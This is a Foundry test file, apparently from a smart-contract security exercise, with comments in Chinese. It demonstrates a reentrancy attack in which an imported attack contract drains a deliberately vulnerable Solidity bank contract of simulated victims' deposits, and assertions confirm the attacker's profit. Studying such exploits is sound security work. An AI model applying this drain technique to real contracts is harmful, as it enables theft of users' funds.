// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CN_bank, MiguanLog} from "../../src/hack/Miguan.sol";
import "../../src/hack/MiguanHack.sol";

contract MiguanTest is Test {
    CN_bank public bank;
    MiguanLog public logger;
    MiguanHack public hack;

    address public attacker = makeAddr("attacker");
    address public victim1 = makeAddr("victim1");
    address public victim2 = makeAddr("victim2");

    function setUp() public {
        // 部署 Log 和 CN_bank
        logger = new MiguanLog();
        bank = new CN_bank(address(logger));

        // 模拟受害者存入 15 ETH
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 5 ether);

        vm.prank(victim1);
        bank.Deposit{value: 10 ether}(0);

        vm.prank(victim2);
        bank.Deposit{value: 5 ether}(0);

        assertEq(address(bank).balance, 15 ether);

        // 部署攻击合约
        vm.prank(attacker);
        hack = new MiguanHack(address(bank));
    }

    function testReentrancyAttack() public {
        // 给攻击者 2 ETH 作为本金（需 > MinSum 才能触发 Collect）
        vm.deal(attacker, 2 ether);

        uint256 bankBalanceBefore = address(bank).balance;
        console.log("Bank balance before attack:", bankBalanceBefore / 1 ether, "ETH");

        // Step 1: 攻击者先存入 2 ETH（需 > 1 ether MinSum）
        vm.prank(attacker);
        hack.deposit{value: 2 ether}();

        // Step 2: 推进时间使 block.timestamp > unlockTime
        vm.warp(block.timestamp + 1);

        // Step 3: 触发取款，receive() 中重入 Collect，掏空银行
        vm.prank(attacker);
        hack.exploit();

        uint256 bankBalanceAfter = address(bank).balance;
        uint256 hackBalance = address(hack).balance;

        console.log("Bank balance after attack: ", bankBalanceAfter / 1 ether, "ETH");
        console.log("Hack contract balance:     ", hackBalance / 1 ether, "ETH");

        // 银行被掏空（或剩余不足 2 ETH 无法继续重入）
        assertLt(bankBalanceAfter, 2 ether, "Bank should be nearly drained");
        // 攻击合约拿到大部分 ETH
        assertGt(hackBalance, 15 ether, "Hack contract should hold stolen ETH");

        // 攻击者提款
        vm.prank(attacker);
        hack.withdraw();

        assertGt(attacker.balance, 15 ether, "Attacker should profit");
    }
}
